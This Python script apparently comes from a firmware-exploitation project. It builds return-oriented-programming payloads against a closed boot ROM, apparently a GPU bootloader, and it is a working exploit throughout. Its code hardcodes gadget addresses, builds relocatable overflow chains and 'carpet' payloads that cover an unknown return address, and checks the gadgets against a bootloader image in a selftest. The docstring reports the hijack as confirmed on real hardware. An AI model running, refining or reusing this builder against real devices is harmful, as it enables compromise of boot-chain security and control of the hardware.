#!/usr/bin/env python3
"""4.53 TÂCHE 1 — the ROP payload builder v446: the FULLY RELOCATABLE
layout + the CARPET mode (the control lane, the machine-day lever).

THE MACHINE-DAY MANDATE (findings-4.45-machine-day.md): the r0 hijack =
CONFIRMED in silicon (the copy+overflow ran BEFORE the verify, NO 0x1d);
the r1 map = the spin UNIFORM across fill_len {64,96,112} x fill_value
{0,0x4a7} => the copy's return address lands in the 0xFF tail BEYOND the
ctx block (the word > 145 = 0x488/8) — UNREACHABLE by the v445 layout
(the ctx fixed at 0x488). THE LEVERS, both in THIS builder:

  L1. THE RELOCATION — the ctx {slot0, cap, dest, magic} and the list
      = placeable at ANY word of the 512-word (4096 B) window; the
      chain = extendable across the WHOLE window (the chain slot =
      ANY word, including the tail beyond 145 — the r1 zone).
  L2. THE CARPET — the anti-strategy for the unknown RA: the zone
      [fill_len, 512) = {the spine-entry, the terminal} repeated
      (mode "pair") — whatever word the ROM's return pops, it lands on
      a LIVE entry (never the 0xFF garbage trap). mode "aligned" =
      the pop-aligned variant (the G40's pop = +8 words = the SAME
      parity — the pair carpet walks the even class; the aligned
      carpet places the G40 every 9th word so the +8 pop ALWAYS hits
      a terminal = the one-step capture, BOTH classes — the property
      is SELF-ASSERTED in the selftest).

The closed ROM = not derivable by bytes — the carpet = the paper's
try-pattern method: the r2a boot = ONE carpet, the outcome = the map
(progress / boot / hang), the RA = inferred by the class.

The constants = IMPORTED from the v445 builder (zero re-transcription,
the v451a lesson): G40 = the 0x40-step epilogue ENTRY 0x10022A,
TERMINAL = the write-primitive entry 0x100B3E, SIZE = 0x1000.

Output: v446_rop_payload.json + v446_rop_payload.bin (the DEFAULT =
the r2a probe: the pair carpet, fill_len=112 — the max swept fill).
emit_c() = the C header (the r1point-style embed); the selftest =
gcc-compiled byte-exact (the 4.44 lesson executed).
"""
import hashlib
import importlib.util
import json
import subprocess
import sys
import tempfile
from pathlib import Path

HERE = Path(__file__).resolve().parent
OUT_JSON = HERE / "v446_rop_payload.json"
OUT_BIN = HERE / "v446_rop_payload.bin"

# -- the v445 constants, IMPORTED (zero re-transcription) ----------------
_spec = importlib.util.spec_from_file_location(
    "v445_build", HERE / "v445_rop_payload_build.py")
V445 = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(V445)

SIZE = V445.SIZE          # 0x1000 — the memdesc
G40 = V445.G40            # 0x10022A — the spine-entry (the 0x40 step)
TERMINAL = V445.TERMINAL  # 0x100B3E — the write-primitive entry
N_WORDS = SIZE // 8       # 512 u64 words — THE WHOLE WINDOW

# the booter image = the TREE GUARD substrate (the entries re-read live)
IMG = HERE.parent.parent / "tools/analysis/gsp-extract/binaries/bootloader.bin"


class LayoutError(ValueError):
    """the layout collision / the impossible geometry — REFUSED, never
    silently resolved (the 4.52 selector-collision discipline)."""


def _words_to_bytes(words):
    return b"".join(w.to_bytes(8, "little") for w in words)


def build_chain(fill_len=64, hops=3, fill_value=0, slot0=1, cap=0x40,
                dest=0x000000000161000, magic=0x08,
                base_addr=0x00000000016A000, valeurs=(0x112,),
                ctx_off=0x91, list_off=0xA0):
    """MODE chain — the v445 layout, FULLY RELOCATABLE.

    The chain = the fill [0, fill_len) + the hijack slot @fill_len +
    the spine @+8k + the terminal @fill_len+8*hops + the walk cell
    (= &list[0], byte-exact) — ALL extendable over the whole window;
    the ctx = the 4 words @ctx_off; the list = @list_off.
    fill_len = 200 (the tail, the r1 zone) works IDENTICALLY.
    """
    if not (0 < fill_len < N_WORDS):
        raise LayoutError(f"fill_len {fill_len} hors fenetre")
    terminal = fill_len + 8 * hops
    walk = terminal + 2
    if terminal + 2 >= N_WORDS:
        raise LayoutError(
            f"la chaine depasse la fenetre: terminal+2 = {terminal+2} >= 512")
    ctx_words = set(range(ctx_off, ctx_off + 4))
    list_words = set(range(list_off, list_off + max(1, len(valeurs))))
    chain_words = set(range(fill_len, walk + 1))
    clash = (chain_words & ctx_words) | (chain_words & list_words) | \
            (ctx_words & list_words)
    if clash:
        raise LayoutError(
            f"collision de layout aux mots {sorted(clash)} — REFUSE "
            f"(deplace ctx_off/list_off)")

    words = [fill_value] * N_WORDS
    words[fill_len] = G40
    for k in range(1, hops):
        words[fill_len + 8 * k] = G40
    words[terminal] = TERMINAL
    words[walk] = base_addr + list_off * 8      # &list[0] — ABSOLUTE
    words[ctx_off + 0] = slot0
    words[ctx_off + 1] = cap
    words[ctx_off + 2] = dest
    words[ctx_off + 3] = magic
    for k, v in enumerate(valeurs):
        words[list_off + k] = v

    meta = {
        "mode": "chain",
        "fill_len": fill_len, "hops": hops,
        "hijack_slot": fill_len,
        "spine_slots": [fill_len + 8 * k for k in range(1, hops)],
        "terminal_slot": terminal, "walk_cell": walk,
        "ctx_off": ctx_off, "list_off": list_off,
        "ctx_fields": ["slot0", "cap", "dest", "magic"],
        "slot0": slot0, "cap": cap, "dest": dest, "magic": magic,
        "base_addr": base_addr, "valeurs": list(valeurs),
    }
    return _words_to_bytes(words), meta


def build_carpet(fill_len=112, fill_value=0, mode="pair", carpet_start=None):
    """MODE carpet — the r2a probe (the anti-strategy at the unknown RA).

    [0, fill_len)          = the UNIFORM FILL (the canary defeat, the
                             r0-proven mechanism — the fill stays whole)
    [fill_len, 512)        = THE CARPET — every word = a LIVE entry:
        mode "pair"       : {G40, TERMINAL} repeated (zone-relative:
                            the even = the spine-entry, the odd = the
                            terminal — the spec's cell verbatim)
        mode "aligned"    : the G40 every 9th zone word, the TERMINAL
                            elsewhere — the pop property (the G40's
                            +8 ALWAYS hits a terminal) = self-asserted
    The ctx/list/walk-cell = NOT PLACED (the named negative: at the
    carpet stage the ctx pointer = the ROM residue a4 — INDECIDABLE;
    the modeled-favorable block = the emulator's TR-2 business).
    """
    if not (0 < fill_len < N_WORDS):
        raise LayoutError(f"fill_len {fill_len} hors fenetre")
    if mode not in ("pair", "aligned"):
        raise LayoutError(f"mode carpet inconnu: {mode!r}")
    if carpet_start is None:
        carpet_start = fill_len
    if not (fill_len <= carpet_start < N_WORDS):
        raise LayoutError(f"carpet_start {carpet_start} hors zone")

    words = [fill_value] * N_WORDS
    zone = list(range(carpet_start, N_WORDS))
    if mode == "pair":
        for i in zone:
            words[i] = G40 if (i - carpet_start) % 2 == 0 else TERMINAL
    else:  # aligned — the pop property: +8 from any G40 = a TERMINAL
        # the G40 = ONLY where the +8 pop stays in the window (a G40
        # within 8 words of the end pops HORS = the property violated —
        # the selftest caught it before the founder, word 508 + 8 = 516)
        for i in zone:
            words[i] = G40 if ((i - carpet_start) % 9 == 0
                               and i + 8 < N_WORDS) else TERMINAL
        # the SELF-ASSERTED design property (the builder refuses to
        # emit a carpet that violates it):
        for i in zone:
            if words[i] == G40:
                if i + 8 >= N_WORDS or words[i + 8] != TERMINAL:
                    raise LayoutError(
                        f"la propriete pop-aligned violee au mot {i} "
                        f"(+8 = {hex(words[i+8]) if i+8 < N_WORDS else 'HORS'})")

    meta = {
        "mode": "carpet", "carpet_mode": mode,
        "fill_len": fill_len, "fill_value": fill_value,
        "carpet_start": carpet_start, "zone_words": len(zone),
        "spine_entries": sum(1 for i in zone if words[i] == G40),
        "terminals": sum(1 for i in zone if words[i] == TERMINAL),
        "named_negative": "the walk cell + the ctx = NOT placed: the "
                          "primitive's operands at the carpet stage = "
                          "the ROM residue (a1 wild, a4 INDECIDABLE) — "
                          "the r2a outcome = the MAP, not the writes",
    }
    return _words_to_bytes(words), meta


def build(mode="carpet", **kw):
    """the dispatcher — mode "chain" | "carpet"."""
    if mode == "chain":
        return build_chain(**kw)
    if mode == "carpet":
        return build_carpet(**kw)
    raise LayoutError(f"mode inconnu: {mode!r}")


def emit_c(payload, symbol="v446_payload"):
    """the C header (the r1point embed pattern)."""
    lines = [f"#define V446_PAYLOAD_SIZE {len(payload)}u",
             f"static const unsigned char {symbol}[{len(payload)}] = {{"]
    for i in range(0, len(payload), 16):
        lines.append("    " + ", ".join(f"0x{b:02x}" for b in
                                        payload[i:i + 16]) + ",")
    lines.append("};")
    return "\n".join(lines) + "\n"


# --------------------------------------------------------------------------
# the selftest — the invariants + the tree guard + the byte-exact C.
# Catches the bugs BEFORE the founder (the 4.51 lesson: test BOTH paths,
# the exact tree members, not the plausible names).
# --------------------------------------------------------------------------
def _selftest():
    results = []

    def check(name, cond, detail=""):
        results.append((name, bool(cond)))
        print(f"[{'PASS' if cond else 'FAIL'}] {name} {detail}")

    # -- 1. the chain mode: the exact slots, the byte-exact walk cell --
    DEST = 0x161000
    BASE = 0x16A000
    p, m = build_chain(fill_len=64, hops=3, dest=DEST, base_addr=BASE,
                       valeurs=(0x112, 0x113))
    w = [int.from_bytes(p[i * 8:(i + 1) * 8], "little")
         for i in range(N_WORDS)]
    check("chain: size 4096", len(p) == 0x1000)
    check("chain: the hijack slot = G40", w[64] == G40)
    check("chain: the spine = G40 x2", w[72] == G40 and w[80] == G40)
    check("chain: the terminal = TERMINAL", w[88] == TERMINAL)
    check("chain: the walk cell = &list[0] byte-exact",
          w[90] == BASE + 0xA0 * 8, f"{w[90]:#x}")
    check("chain: the ctx = the 4 fields @0x91",
          (w[0x91], w[0x92], w[0x93], w[0x94]) == (1, 0x40, DEST, 8))
    check("chain: the list = the valeurs @0xA0",
          (w[0xA0], w[0xA1]) == (0x112, 0x113))

    # -- 2. THE RELOCATION: the same chain, the ctx elsewhere = pure --
    p2, m2 = build_chain(fill_len=64, hops=3, dest=DEST, base_addr=BASE,
                         valeurs=(0x112, 0x113), ctx_off=0x100,
                         list_off=0x110)
    w2 = [int.from_bytes(p2[i * 8:(i + 1) * 8], "little")
          for i in range(N_WORDS)]
    # the walk cell = part of the chain but its VALUE = &list[0] — it
    # RE-TARGETS when the list relocates (the selftest caught the
    # missing word 90 in the expected diff — the founder never saw it)
    diff = [i for i in range(N_WORDS) if w[i] != w2[i]]
    expected_diff = sorted(set(range(0x91, 0x95)) | set(range(0xA0, 0xA2)) |
                           set(range(0x100, 0x104)) | set(range(0x110, 0x112)) |
                           {90})
    check("reloc: the diff = EXACTLY the old+new ctx/list + the walk cell",
          diff == expected_diff,
          f"{len(diff)} mots ({hex(diff[0])}..{hex(diff[-1])})")
    check("reloc: the chain words IDENTICAL (hijack+spine+terminal)",
          all(w[i] == w2[i] for i in range(64, 90)))
    check("reloc: the walk cell retargeted = &list[0] @0x110",
          w2[90] == BASE + 0x110 * 8)

    # -- 3. THE TAIL CHAIN (the r1 zone, the word > 145) --
    pt, mt = build_chain(fill_len=200, hops=3, dest=DEST, base_addr=BASE)
    wt = [int.from_bytes(pt[i * 8:(i + 1) * 8], "little")
          for i in range(N_WORDS)]
    check("tail: the hijack @200 = G40", wt[200] == G40)
    check("tail: the spine 208/216", wt[208] == G40 and wt[216] == G40)
    check("tail: the terminal @224", wt[224] == TERMINAL)
    check("tail: the walk @226 = &list[0]",
          wt[226] == BASE + 0xA0 * 8)
    check("tail: the ctx @0x91 intact",
          wt[0x91] == 1 and wt[0x93] == DEST)

    # -- 4. the collision REFUSALS (the builder refuses, never resolves) --
    refused = 0
    for kw in (dict(ctx_off=72),                       # the ctx = the spine
               dict(list_off=0x93),                    # the list = the ctx
               dict(fill_len=505, hops=3)):            # hors fenetre
        try:
            build_chain(dest=DEST, **kw)
        except LayoutError:
            refused += 1
    check("refusals: 3/3 collisions REFUSED", refused == 3)

    # -- 5. the pair carpet: the coverage + the fill uniformity --
    pc, mc = build_carpet(fill_len=112, mode="pair")
    wc = [int.from_bytes(pc[i * 8:(i + 1) * 8], "little")
          for i in range(N_WORDS)]
    check("carpet-pair: the fill = uniform [0,112)",
          all(x == 0 for x in wc[:112]))
    check("carpet-pair: EVERY zone word = a live entry",
          all(x in (G40, TERMINAL) for x in wc[112:]))
    check("carpet-pair: the zone parity exact",
          all(wc[112 + i] == (G40 if i % 2 == 0 else TERMINAL)
              for i in range(400)),
          f"spine={mc['spine_entries']} term={mc['terminals']}")
    check("carpet-pair: the counts = 200/200",
          mc["spine_entries"] == 200 and mc["terminals"] == 200)

    # -- 6. the aligned carpet: THE POP PROPERTY (self-asserted) --
    pa, ma = build_carpet(fill_len=112, mode="aligned")
    wa = [int.from_bytes(pa[i * 8:(i + 1) * 8], "little")
          for i in range(N_WORDS)]
    pops_ok = all(wa[i + 8] == TERMINAL
                  for i in range(112, N_WORDS) if wa[i] == G40 and i + 8 < 512)
    check("carpet-aligned: every G40 pops +8 = a TERMINAL", pops_ok)
    check("carpet-aligned: the G40 cadence = every 9th (the tail 8 = T)",
          all(wa[112 + i] == (G40 if (i % 9 == 0 and 112 + i + 8 < 512)
              else TERMINAL) for i in range(400)))
    check("carpet-aligned: the one-step capture property = both classes",
          all(wa[i] == TERMINAL or wa[i + 8] == TERMINAL
              for i in range(112, 504)))

    # -- 7. THE TREE GUARD — the entries re-read LIVE from the image --
    # BOTH entries = c.ldsp (RVC quadrant 2, funct3 011 — the mask
    # 0xE003/0x6002); the DISTINCTION = the exact rd member (the 4.51
    # lesson: the exact tree members, not the plausible names):
    #   G40 @0x10022a  = c.ldsp ra,0x38(sp)  (rd = x1  = ra)
    #   TERMINAL @0x100b3e = c.ldsp a5,0x8(sp) (rd = x15 = a5)
    img = IMG.read_bytes()
    g40_off = G40 - 0x100000
    term_off = TERMINAL - 0x100000
    i_g40 = int.from_bytes(img[g40_off:g40_off + 2], "little")
    i_term = int.from_bytes(img[term_off:term_off + 2], "little")
    check("tree-guard: G40 @0x10022a = c.ldsp ra,0x38(sp) (rd = x1)",
          (i_g40 & 0xE003) == 0x6002 and ((i_g40 >> 7) & 0x1F) == 1,
          f"enc={i_g40:#06x}")
    check("tree-guard: TERMINAL @0x100b3e = c.ldsp a5,0x8(sp) (rd = x15)",
          (i_term & 0xE003) == 0x6002 and ((i_term >> 7) & 0x1F) == 15,
          f"enc={i_term:#06x}")
    check("tree-guard: the constants == the v445 imports (zero drift)",
          G40 == 0x10022A and TERMINAL == 0x100B3E and SIZE == 0x1000)

    # -- 8. the byte-exact C (the 4.44 lesson): gcc dumps == python --
    with tempfile.TemporaryDirectory() as td:
        td = Path(td)
        plans = [("chain", p), ("pair", pc), ("aligned", pa)]
        ok = True
        for name, pay in plans:
            (td / "payload.h").write_text(emit_c(pay))
            (td / "main.c").write_text(
                '#include <stdio.h>\n#include "payload.h"\n'
                "int main(void){ for (int i=0;i<V446_PAYLOAD_SIZE;i++) "
                'printf("%02x", v446_payload[i]); return 0; }\n')
            r = subprocess.run(["gcc", "-I", str(td), str(td / "main.c"),
                                "-o", str(td / "dump")],
                               capture_output=True)
            if r.returncode != 0:
                check(f"byte-exact C [{name}]: gcc", False, r.stderr.decode())
                ok = False
                continue
            dump = bytes.fromhex(
                subprocess.run([str(td / "dump")], capture_output=True,
                               text=True).stdout.strip())
            good = dump == pay
            ok &= good
            if len(plans) == 3 and name == "chain":
                check(f"byte-exact C [chain]: the dump == the python",
                      good, f"{len(dump)} B")
            else:
                print(f"    byte-exact C [{name}]: {'ok' if good else 'FAIL'}")
        check("byte-exact C: 3/3 plans (chain + pair + aligned)", ok)

    n_pass = sum(1 for _, okk in results if okk)
    print(f"selftest v446: {n_pass}/{len(results)} PASS")
    return 0 if n_pass == len(results) else 1


def main():
    if "--selftest" in sys.argv:
        return _selftest()

    # the DEFAULT = the r2a probe payload (the pair carpet)
    payload, meta = build_carpet(fill_len=112, mode="pair")
    sha = hashlib.sha256(payload).hexdigest()
    OUT_BIN.write_bytes(payload)
    doc = {
        "what": "4.53 the control lane — the v446 builder: the fully "
                "relocatable layout + the carpet (the machine-day levers)",
        "mandate": findings_mandate(),
        "default_build": {
            "mode": "carpet/pair", "fill_len": 112,
            "why_112": "the max r1-swept fill — the canary zone covered; "
                       "the carpet = [112, 512) = 400 live entries",
            "zone": {"spine_entries": meta["spine_entries"],
                     "terminals": meta["terminals"]},
        },
        "modes": {
            "chain": "the v445 layout fully relocatable: the ctx/list at "
                     "ANY word, the chain across the whole window 0-511 "
                     "(the tail > 145 = the r1 zone), the collisions "
                     "REFUSED",
            "carpet/pair": "the spec's cell {spine-entry, terminal} "
                           "repeated zone-relative — the odd class = the "
                           "immediate terminal, the even class = the G40 "
                           "walk (+8 = the same parity — measured TR-2)",
            "carpet/aligned": "the pop-aligned variant: the G40 every 9th "
                              "word, the +8 pop ALWAYS a terminal — the "
                              "one-step capture BOTH classes (the property "
                              "self-asserted at build time)",
        },
        "constants_imported": {
            "G40": hex(G40), "TERMINAL": hex(TERMINAL), "SIZE": hex(SIZE),
            "source": "v445_rop_payload_build.py — zero re-transcription",
        },
        "assumptions": {
            "A5_ra_position": "HYPOTHESE (the r1 map): the copy's RA = a "
                              "FIXED word > 145, independent of the fill — "
                              "the r2a boot = the probe that decides",
            "A6_residue": "a1/a4/a3 at the carpet capture = the ROM "
                          "residue — INDECIDABLE-BY-BYTES; the TR-2 tests "
                          "model the FAVORABLE block (the A3 discipline), "
                          "the wild write = named (W2)",
            "A2_fill": "the zero-canary (the freestanding ROM, no RNG) — "
                       "the 0x4a7 alternative = the r1-swept, both spin",
        },
        "meta": meta, "sha256": sha, "size": len(payload),
    }
    OUT_JSON.write_text(json.dumps(doc, indent=1))
    print(f"payload: {len(payload)} B  sha256 {sha[:16]}…  "
          f"mode={meta['mode']}/{meta.get('carpet_mode')}  "
          f"zone [{meta['carpet_start']},512) = "
          f"{meta['spine_entries']} spine + {meta['terminals']} terminal")
    return 0


def findings_mandate():
    return ("the r0 hijack = CONFIRMED in silicon; the r1 map = the RA "
            "beyond the ctx block (the word >145); the levers = the "
            "relocation (L1) + the carpet (L2); the closed ROM = not "
            "derivable by bytes — the try-pattern method")


if __name__ == "__main__":
    sys.exit(main())
